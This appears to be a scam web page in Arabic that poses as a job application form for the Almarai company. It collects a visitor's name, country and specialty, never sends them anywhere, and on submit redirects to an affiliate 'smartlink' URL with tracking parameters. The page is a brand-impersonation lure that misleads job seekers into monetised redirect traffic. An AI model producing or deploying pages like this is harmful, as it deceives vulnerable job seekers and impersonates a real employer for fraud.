<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="theme-color" content="#087443">
  <title>وظائف شركة المراعي</title>
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      margin: 0;
      min-height: 100vh;
      padding: 20px 14px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: Tahoma, Arial, sans-serif;
      background: linear-gradient(145deg, #e7f6ec, #f8fbf8);
      color: #18352a;
    }
    .container {
      width: 100%;
      max-width: 430px;
      overflow: hidden;
      background: #fff;
      border: 1px solid #dceee2;
      border-radius: 20px;
      box-shadow: 0 12px 40px rgba(0, 70, 40, .12);
    }
    .header {
      padding: 30px 20px;
      text-align: center;
      color: #fff;
      background: linear-gradient(135deg, #075b37, #10945b);
    }
    .logo {
      width: 64px;
      height: 64px;
      margin: 0 auto 14px;
      display: flex;
      align-items: center;
      justify-content: center;
      border-radius: 50%;
      background: #fff;
      color: #087443;
      font-size: 29px;
      font-weight: bold;
    }
    h1 {
      margin: 0;
      font-size: 25px;
      line-height: 1.6;
    }
    .subtitle {
      margin: 9px 0 0;
      font-size: 14px;
      line-height: 1.9;
      color: #e5f7ec;
    }
    .content {
      padding: 25px 22px 28px;
    }
    .intro {
      margin: 0 0 22px;
      text-align: center;
      color: #53685c;
      font-size: 15px;
      line-height: 1.9;
    }
    .field {
      margin-bottom: 17px;
    }
    label {
      display: block;
      margin-bottom: 8px;
      color: #254d38;
      font-size: 14px;
      font-weight: bold;
    }
    input {
      width: 100%;
      height: 49px;
      padding: 0 14px;
      border: 1px solid #d6e4da;
      border-radius: 10px;
      outline: none;
      background: #fbfdfb;
      font-family: inherit;
      font-size: 15px;
    }
    input:focus {
      border-color: #10945b;
    }
    input::placeholder {
      color: #9aa99f;
    }
    button {
      width: 100%;
      min-height: 51px;
      margin-top: 7px;
      border: 0;
      border-radius: 11px;
      background: linear-gradient(135deg, #087443, #10a363);
      color: white;
      font-family: inherit;
      font-size: 17px;
      font-weight: bold;
      cursor: pointer;
    }
    button:disabled {
      opacity: .7;
    }
    .notice {
      margin: 17px 0 0;
      text-align: center;
      color: #718278;
      font-size: 12px;
      line-height: 1.8;
    }
    .footer {
      padding: 13px;
      text-align: center;
      background: #f6faf7;
      color: #84948a;
      font-size: 11px;
    }
    #message {
      display: none;
      margin-top: 14px;
      color: #a33b30;
      text-align: center;
      font-size: 13px;
      line-height: 1.8;
    }
  </style>
</head>
<body>
  <main class="container">
    <header class="header">
      <div class="logo" aria-hidden="true">م</div>
      <h1>وظائف شركة المراعي</h1>
      <p class="subtitle">
        نموذج بيانات للراغبين في التقديم على الوظائف
      </p>
    </header>
    <section class="content">
      <p class="intro">
        أدخل بياناتك الأساسية للمتابعة إلى الصفحة التالية.
      </p>
      <form id="jobForm">
        <div class="field">
          <label for="name">الاسم</label>
          <input
            id="name"
            name="name"
            type="text"
            placeholder="اكتب اسمك"
            autocomplete="name"
            required
          >
        </div>
        <div class="field">
          <label for="country">الدولة</label>
          <input
            id="country"
            name="country"
            type="text"
            placeholder="اكتب اسم الدولة"
            autocomplete="country-name"
            required
          >
        </div>
        <div class="field">
          <label for="specialty">التخصص</label>
          <input
            id="specialty"
            name="specialty"
            type="text"
            placeholder="اكتب تخصصك أو مجال العمل"
            required
          >
        </div>
        <button id="submitBtn" type="submit">
          إرسال البيانات
        </button>
        <p id="message" role="alert"></p>
      </form>
      <p class="notice">
        يرجى التأكد من صحة البيانات قبل المتابعة.
      </p>
    </section>
    <footer class="footer">
      
    </footer>
  </main>
  <script>
    const SMARTLINK =
      "https://onelead.odinllm.com/?utm_medium=f4971a16d63e6b3940dce3348a955147548b040f&utm_campaign=cr7";
    const form = document.getElementById("jobForm");
    const button = document.getElementById("submitBtn");
    form.addEventListener("submit", function(event) {
      event.preventDefault();
      if (!form.reportValidity()) return;
      button.disabled = true;
      button.textContent = "جاري المتابعة...";
      window.location.href = SMARTLINK;
    });
  </script>
</body>
</html>
